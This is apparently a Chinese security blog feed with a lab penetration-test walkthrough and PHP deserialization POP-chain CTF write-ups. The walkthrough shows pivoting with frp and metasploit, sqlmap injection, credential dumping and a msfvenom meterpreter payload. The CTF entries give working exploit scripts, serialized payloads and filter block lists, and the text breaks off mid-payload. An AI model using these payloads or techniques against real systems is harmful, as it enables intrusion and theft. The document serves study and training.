class="line">run autoroute -s 192.168.22.0/24</span><br><span class="line">run autoroute -p</span><br><span class="line">route</span><br></pre></td></tr></table></figure><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210917161014242.png" alt="image-20210917161014242"></p><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure><p>对192.168.22.0/24段进行扫描</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210917160758243.png" alt="image-20210917160758243"></p><p>扫到   192.268.22.129这一堆</p><p>同时学习了 frp流量转发 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">frp流量转发  </span><br><span class="line">攻击机 安装frp</span><br><span class="line">配置端口  </span><br><span class="line">[common]</span><br><span class="line">server_addr = 10.203.87.148</span><br><span class="line">server_port = 7000</span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port =9091</span><br><span class="line">上传frpc  和frpc.ini文件到靶机  权限改为777</span><br><span class="line">靶机运行 ./frpc</span><br><span class="line">攻击机运行 ./frps -c frps.ini   </span><br></pre></td></tr></table></figure><p>流量转发成功。</p><p><img src="image-20210913214913042.png" alt="image-20210913214913042"></p><p><img src="image-20210913214628063.png" alt="image-20210913214628063"></p><p>是个八哥cms</p><p><img src="image-20210918183457411.png" alt="image-20210918183457411"></p><p>扫一下目录</p><p><img src="image-20210914111225355.png" alt="image-20210914111225355"></p><p>先查看 robots.txt</p><p><img src="image-20210914111327786.png" alt="image-20210914111327786"></p><p>捡到宝啦 </p><p><img src="image-20210915134225965.png" alt="image-20210915134225965"></p><p><img src="image-20210914112917498.png" alt="image-20210914112917498"></p><p>怀疑有sql  给 sqlmap配个socks代理哦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py --proxy socks5://10.203.87.148:1234 -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; -p keyword</span><br></pre></td></tr></table></figure><p><img src="image-20210914205706242.png" alt="image-20210914205706242"></p><p>跑出来；了  找找密码  随手dump数据库</p><p><img src="image-20210914205853366.png" alt="image-20210914205853366"></p><p>找到密码 登上去  米西米西  </p><p><code>admin/123qwe</code></p><p><img src="image-20210914205955876.png" alt="image-20210914205955876"></p><p>bagecms V3.1.3 存在  后台任意文件读取漏洞</p><p><img src="image-20210914212345124.png" alt="image-20210914212345124"></p><p>活捉   </p><p><img src="image-20210914214541122.png" alt="image-20210914214541122"></p><p>火速上车</p><p><code>ifconfig</code></p><p><img src="image-20210915134001181.png" alt="image-20210915134001181"></p><p>使用proxifiter将流量代理到10.203.87.119:1080端口使用工具，连接webshell。 下一台的情况和这台差不多，双网卡还存在一个33网段的ip，进行存活主机探测下一个 靶机  应该是通过192.168.33.0/24这块网卡继续  </p><p>使用<code>uname -a</code>查询靶机版本信息</p><p>msf生成一个  正向链接的 马    给 777</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=54321 -f elf &gt; mbg.elf</span><br></pre></td></tr></table></figure><p>然后连接以后 </p><p>添加路由 </p><p>信息收集  </p><p>扫端口  </p><p>445  永恒之蓝，</p><p>靶机  跑了     。。。。。。。</p><p><strong>反思</strong></p><p>   1.对于各种  流程太不熟悉  做完一块以后   不知道  该干啥      </p><ol start="2"><li>msf不会用,   得学    下次 写总结  。</li><li>对于  网络拓补   相关知识 细节方面 不够了解   有时候知道</li><li></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化练习</title>
      <link href="/2021/08/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/08/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>php反序列化中针对pop链的学习和练习</p></blockquote><h4 id="POP-面向属性编程"><a href="#POP-面向属性编程" class="headerlink" title="POP:面向属性编程"></a>POP:面向属性编程</h4><p>面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。</p><span id="more"></span><p>基本概念</p><p>在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，当然进行反序列化的数据能够被用户输入所控制。</p><p>练习1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Read &#123;</span><br><span class="line">    public $var;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $content = $this-&gt;file_get($this-&gt;var);</span><br><span class="line">        echo $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo $this-&gt;source.&#x27;Welcome&#x27;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;,$this-&gt;source))  &#123;</span><br><span class="line">            die(&#x27;hacker&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;hello&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    unserialize($_GET[&#x27;hello&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $show = new Show(&#x27;pop3.php&#x27;);</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来我们来分析构造pop链的过程</p><p>很明显此题考查PHP反序列化构造POP链，遇到此类题型首先寻找可以读取文件的函数，再去寻找可以互相触发从而调用的魔术方法，最终形成一条可以触发读取文件函数的POP链。<br>对于此题可以看到我们的目的是通过构造反序列化读取flag.php文件，在Read类有file_get_contents()函数，Show类有highlight_file()函数可以读取文件。接下来寻找目标点可以看到在最后几行有unserialize函数存在，该函数的执行同时会触发wakeup魔术方法，而wakeup魔术方法可以看到在Show类中。<br>再次看下<code>__wakeup</code>魔术方法中，存在一个正则匹配函数preg_match()，该函数第二个参数应为字符串，这里把source当作字符串进行的匹配，这时若这个source是某个类的对象的话，就会触发这个类的<code>__tostring</code>方法，通篇看下代码发现<code>__tostring</code>魔术方法也在Show类中，那么我们一会构造exp时将source变成Show这个类的对象就会触发<code>__tostring</code>方法。<br>再看下<code>__tostring</code>魔术方法中，首先找到str这个数组，取出key值为str的value值赋给source，那么如果这个value值不存在的话就会触发<code>__get</code>魔术方法。再次通读全篇，看到Test类中存在<code>__get</code>魔术方法。<br>那么此时如果str数组中key值为str对应的value值source是Test类的一个对象，就触发了<code>__get</code>魔术方法。看下<code>__get</code>魔术方法，发现先取Test类中的属性p给function变量，再通过return $function()把它当作函数执行，这里属性p可控。这样就会触发<code>__invoke</code>魔术方法，而<code>__invoke</code>魔术方法存在于Read类中。<br>可以看到<code>__invoke</code>魔术方法中调用了该类中的file_get方法，形参是var属性值（这里我们可以控制），实参是value值，从而调用file_get_contents函数读取文件内容，所以只要将Read类中的var属性值赋值为flag.php即可<br>POP链：unserialize函数（变量可控）–&gt;<code>__wakeup()魔术方法</code>–&gt;<code>__tostring()魔术方法</code>–&gt;<code>__get魔术方法</code>–&gt;<code>__invoke</code>魔术方法–&gt;触发Read类中的file_get方法–&gt;触发file_get_contents函数读取flag.php</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Read &#123;</span><br><span class="line">    public $var = &quot;flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show &#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test &#123;</span><br><span class="line">    public $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$r = new Read();</span><br><span class="line">$s = new Show();</span><br><span class="line">$t = new Test();</span><br><span class="line">$t-&gt;p = $r; //赋值Test类的对象($t)下的属性p为Read类的对象($r)，触发__invoke魔术方法</span><br><span class="line">$s-&gt;str[&#x27;str&#x27;] = $t;//赋值Show类的对象($s)下的str数组的str键的值为 Test类的对象$t ，触发__get魔术方法。</span><br><span class="line">$s-&gt;source = $s;//令 Show类的对象($s)下的source属性值为此时上一步已经赋值过的$s对象，从而把对象当作字符串调用触发。__tostring魔术方法</span><br><span class="line">echo urlencode((serialize($s)));</span><br></pre></td></tr></table></figure><p>这里使用urlencode是为了编码 private 和protect属性，防止他们序列化出来有 %00 造成截断</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210908211000665.png" alt="image-20210908211000665"></p><p>最后得出来的payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3Ba%3A1%3A%7Bs%3A3%3A%22str%22%3BO</span><br></pre></td></tr></table></figure><p>最后利用结果</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210908210939860.png" alt="image-20210908210939860"></p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210908211056738.png" alt="image-20210908211056738"></p><p>练习2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class start_gg</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Call</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function test1()</span><br><span class="line">    &#123;</span><br><span class="line">            $this-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class funct</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __call($test2,$arr)</span><br><span class="line">        &#123;</span><br><span class="line">                $s1 = $this-&gt;mod1;</span><br><span class="line">                $s1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class func</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __invoke()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line">class string1</span><br><span class="line">&#123;</span><br><span class="line">        public $str1;</span><br><span class="line">        public $str2;</span><br><span class="line">        public function __toString()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;str1-&gt;get_flag();</span><br><span class="line">                return &quot;1&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class GetFlag</span><br><span class="line">&#123;</span><br><span class="line">        public function get_flag()</span><br><span class="line">        &#123;</span><br><span class="line">                echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[&#x27;string&#x27;];</span><br><span class="line">unserialize($a);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class start_gg</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1;</span><br><span class="line">    public $mod2;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1 = new Call();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1-&gt;test1(); # 入口点，mod1可通过附值起跳。</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Call</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1; # 实例化funct</span><br><span class="line">    public $mod2; # 无它什么事</span><br><span class="line"></span><br><span class="line">    # 继续起跳，瞻前顾后，思考下面的 $this-&gt;mod1-&gt;test2();会在何处被什么利用</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1 = new funct();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function test1()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1-&gt;test2(); # 这里调 __call</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class funct</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1; # 实例化func</span><br><span class="line">    public $mod2; # 无它什么事</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1 = new func();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($test2, $arr)</span><br><span class="line">    &#123;</span><br><span class="line">        $s1 = $this-&gt;mod1;</span><br><span class="line">        $s1(); # 这里触发 __invoke</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class func</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1; # 实例化string1</span><br><span class="line">    public $mod2; # __invoke对其附值，其实是为了调 __toString</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1 = new string1();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod2 = &quot;字符串拼接&quot; . $this-&gt;mod1; # 这里若拼接则会触发 __toString</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class string1</span><br><span class="line">&#123;</span><br><span class="line">    public $str1; # 实例化 GetFlag</span><br><span class="line">    public $str2;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str1 = new GetFlag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str1-&gt;get_flag(); #调用此处即可getflag，难点：需调用 __toString</span><br><span class="line">        return &quot;1&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GetFlag</span><br><span class="line">&#123;</span><br><span class="line">    public function get_flag()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;flag:&quot; . &quot;xxxxxxxxxxxx&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$payload = new start_gg();</span><br><span class="line">echo urlencode(serialize($payload));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210908211221621.png" alt="image-20210908211221621"></p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210908211251456.png" alt="image-20210908211251456"></p><h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h1><p>知识点：php反序列化构造pop链</p><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">  protected $var;</span><br><span class="line">  public function append($value)&#123;</span><br><span class="line">    include($value);</span><br><span class="line">  &#125;</span><br><span class="line">  public function __invoke()&#123;</span><br><span class="line">    $this-&gt;append($this-&gt;var);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">  public $source;</span><br><span class="line">  public $str;</span><br><span class="line">  public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">    $this-&gt;source = $file;</span><br><span class="line">    echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  public function __toString()&#123;</span><br><span class="line">    return $this-&gt;str-&gt;source;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function __wakeup()&#123;</span><br><span class="line">    if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">      echo &quot;hacker&quot;;</span><br><span class="line">      $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">  public $p;</span><br><span class="line">  public function __construct()&#123;</span><br><span class="line">    $this-&gt;p = array();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function __get($key)&#123;</span><br><span class="line">    $function = $this-&gt;p;</span><br><span class="line">    return $function();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">  @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">  $a=new Show;</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据以上代码，当用get方法传一个pop参数后，会自动调用Show类的<code>_wakeup()</code>魔术方法。<br><code>_wakeup()</code>通过preg_match()将$this-&gt;source做字符串比较，如果$this-&gt;source是Show类，就调用了<code>__toString()</code>方法；如果<code>__toString()</code>其中str赋值为一个实例化的Test类，那么其类不含有source属性，所以会调用Test中的<code>_get()</code>方法。如果<code>_get()</code>中的p赋值为Modifier类，那么相当于Modifier类被当作函数处理，所以会调用Modifier类中的<code>_invoke()</code>方法。利用include的文件包含漏洞，使用<code>_invoke()</code>读取flag.php的内容。</p><p>思路：首先反序列化一个实例化的Show($a),就会调用<code>_wakeup()</code>,其中$a会被赋值给source。所以让$a是一个实例化的Show类，这样就会调用<code>_tostring()</code>,然后让里面的$a这个Show类中的str赋值为Test()类，然后让str这个Test()类中的p赋值为Modifier()类。<br>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier&#123;</span><br><span class="line">protected  $var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str=new Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$hack=new Show();</span><br><span class="line">$hack-&gt;source=new Show();</span><br><span 